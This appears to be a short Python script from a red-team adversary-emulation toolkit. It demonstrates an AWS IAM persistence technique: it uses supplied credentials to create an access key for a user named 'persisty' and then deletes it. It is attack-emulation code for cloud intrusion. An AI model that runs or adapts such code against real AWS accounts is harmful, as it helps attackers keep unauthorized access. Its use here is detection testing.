# AWS TTP Persistence / persistence create user
# Createuser
# Hashicorp Red
import boto3
import time

def listActions():
    print('CreateUser ✓')

def iam_persist(ak,sk):
    print('\nExecuting IAM AccessKey Peristence:')
    time.sleep(10)
    # Use supplied iam keys
    session = boto3.session.Session(aws_access_key_id=ak, aws_secret_access_key=sk, region_name='us-east-1')
    iam = session.client('iam')
    key_response = iam.create_access_key(UserName='persisty')
    iam.delete_access_key(UserName='persisty', AccessKeyId=key_response['AccessKey']['AccessKeyId'])
    listActions()
    return key_response

